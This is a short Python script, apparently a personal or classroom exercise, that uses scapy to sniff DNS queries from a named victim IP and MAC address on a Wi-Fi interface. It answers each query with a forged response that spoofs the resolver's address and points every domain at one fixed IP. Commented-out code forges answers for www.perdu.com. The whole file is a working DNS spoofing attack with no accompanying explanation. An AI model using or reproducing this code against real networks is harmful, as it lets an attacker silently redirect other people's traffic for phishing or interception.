from scapy.all import *
import socket

# def reply(p):
#     targetID = p[DNS].id
#     Victimport = p[TCP].sport
#     VictimIP=p[IP].src
#     victimMAC=p[Ether].src
#     p2 = Ether(dst=victimMAC)/IP(src='82.165.179.197',dst=VictimIP)/UDP(sport=53,dport=Victimport)/DNS(id=targetID,qr=1,rd=1,ra=1,qd=DNSQR(qname='www.perdu.com.'),an=DNSRR(rrname='www.perdu.com.',ttl=42,rdata='1.2.3.4'))
#     sendp(p2, iface='Wi-Fi')

# sniff(iface='Wi-Fi', filter='udp and port 53',prn=reply)


victim_addr = '129.104.223.168'  # my ip
victim_ether_addr = 'a0:51:0b:10:3e:e8'
target_iface = 'Intel(R) Wireless-AC 9560 160MHz'


# def dns_resolver(domain_name):
#     x = raw_input (domain_name)
#     data = socket.gethostbyname_ex(x)
#     print ("\n\nThe IP Address of the Domain Name is: "+repr(data))
#     return repr(data)

def resolve_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.error as e:
        return f"Error resolving IP address for {domain}: {str(e)}"


def resolve(domain_name):
    #if domain_name == 'www.martensville.ca.':
    return '172.67.133.176'
    #else:
        #resolve_ip_address(domain_name)


def reply(p):
    if DNS in p:
        domain_name = p[DNS].qd.qname
        domain_name = domain_name.decode('utf-8')
        print(domain_name)
        # print(type(domain_name))
        target_addr = p[IP].dst
        redirect_addr = resolve(domain_name)
        dns = DNS(id=p[DNS].id, qr=1, rd=p[DNS].rd, ra=p[DNS].ra, qd=p[DNS].qd,
                  an=DNSRR(rrname=domain_name, ttl=42, rdata=redirect_addr))
        # p2 = Ether(src= victim_ether_addr, dst=victim_ether_addr)/IP(src=target_addr,dst=victim_addr)/UDP(sport=53,dport=p[UDP].sport)/dns
        p2 = Ether(dst=victim_ether_addr) / IP(src=target_addr, dst=victim_addr) / UDP(sport=53,dport=p[UDP].sport) / dns
        sendp(p2, iface=target_iface)
        print("DNS response sent")


bpf_filter = 'udp and port 53 and src ' + victim_addr
sniff(iface=target_iface, filter=bpf_filter, prn=reply)